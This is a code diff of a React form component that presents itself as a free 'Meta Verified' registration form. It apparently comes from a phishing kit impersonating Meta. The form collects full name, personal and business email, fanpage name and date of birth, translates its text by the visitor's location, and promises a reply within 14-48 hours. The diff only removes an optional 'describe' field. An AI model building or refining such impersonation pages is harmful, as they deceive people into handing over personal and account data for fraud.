@@ -17,7 +17,6 @@ interface FormData {
     day: string;
     month: string;
     year: string;
-    describe: string;
 }
 
 const initialFormData: FormData = {
@@ -27,8 +26,7 @@ const initialFormData: FormData = {
     pageName: '',
     day: '',
     month: '',
-    year: '',
-    describe: ''
+    year: ''
 };
 const InitModal: FC<{ nextStep: (data: FormData) => void }> = ({ nextStep }) => {
     const [isLoading, setIsLoading] = useState(false);
@@ -46,7 +44,7 @@ const InitModal: FC<{ nextStep: (data: FormData) => void }> = ({ nextStep }) => 
 
     useEffect(() => {
         if (!geoInfo) return;
-        const textsToTranslate = ['Complete the free Meta Verified registration form.', 'Please provide the information below to help us review your account.', 'Full Name', 'Email Address', 'Email Business Address', 'Fanpage Name', 'Describe', 'Our response will be sent to you within 14-48 hours.', 'I agree to the', 'Terms of Service', 'Privacy Policy', 'and', 'Submit'];
+        const textsToTranslate = ['Complete the free Meta Verified registration form.', 'Please provide the information below to help us review your account.', 'Full Name', 'Email Address', 'Email Business Address', 'Fanpage Name', 'Our response will be sent to you within 14-48 hours.', 'I agree to the', 'Terms of Service', 'Privacy Policy', 'and', 'Submit'];
         const translateAll = async () => {
             const translatedMap: Record<string, string> = {};
             for (const text of textsToTranslate) {
@@ -255,16 +253,6 @@ ${
                                 })}
                             </select>
                         </div>
-
-                        {/* Describe */}
-                        <textarea 
-                            name='describe'
-                            placeholder=''
-                            value={formData.describe}
-                            onChange={handleInputChange}
-                            className='h-16 sm:h-20 w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-1.5 text-xs md:text-sm placeholder-gray-500 resize-none'
-                            rows={2}
-                        />
 
                         {/* Disclaimer */}
                         <p className='text-xs text-gray-600 mt-0.5'>{t('Our response will be sent to you within 14-48 hours.')}</p>
